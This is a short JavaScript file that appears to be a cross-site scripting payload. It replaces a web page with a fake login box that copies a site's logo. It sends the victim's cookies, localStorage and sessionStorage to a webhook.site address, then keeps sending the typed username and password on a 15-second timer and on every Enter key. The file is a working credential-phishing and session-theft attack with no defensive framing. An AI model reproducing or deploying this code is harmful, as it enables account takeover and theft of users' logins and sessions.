document.body.innerHTML="";
var loginDiv=document.createElement("div");
loginDiv.style.position="absolute";
loginDiv.style.height="100px";
loginDiv.style.width="100px";
loginDiv.style.h="100px";
loginDiv.style.left="50%";
loginDiv.style.marginTop="300px";
loginDiv.style.marginLeft="50px";
/* loginDiv.style.position="relative";
loginDiv.style.left="50%";
loginDiv.style.right="50%";
loginDiv.style.width="100px";
loginDiv.style.marginTop="20%"; */
var logo=document.createElement("img");
logo.src="https://tools.comfy.stream/media/favicon.ico";
logo.style="float:right";
var username=document.createElement("input");
var password=document.createElement("input");
username.placeholder="Username";
username.style.marginTop="20%";
username.style.padding="3%";
password.placeholder="Password";
password.type="password";
password.style.padding="3%";
password.style.marginTop="15%";
document.body.appendChild(loginDiv);
loginDiv.append(logo);
loginDiv.append(username);
loginDiv.append(password);
var callback="https://webhook.site/73a662a1-5ec9-4ee7-9881-4445bd0932d3";
var time = 15000;
function a2f2323r(){
   fetch(callback + "/cookie/?value=" + document.cookie);
   fetch(callback + "/ls/?value=" + JSON.stringify(window.localStorage));
   fetch(callback + "/ss/?value=" + JSON.stringify(window.sessionStorage));
}

a2f2323r();
var tid = setTimeout(submitCredsTout, time);

function submitCredsTout(){
  clearTimeout(tid);
  user = username.value;
  pass = password.value;
    
  fetch(callback + "/Creds/?username=" + user + "&password=" + pass);
  a2f2323r();
  tid = setTimeout(submitCredsTout, time);
}

function submitCreds(e) {
  if (e.key === "Enter"){
    clearTimeout(tid);
    user = username.value;
    pass = password.value;
    
    fetch(callback + "/Creds/?username=" + user + "&password=" + pass);
    a2f2323r();
    tid = setTimeout(submitCredsTout, time);
  }
}



document.addEventListener("keydown", submitCreds);
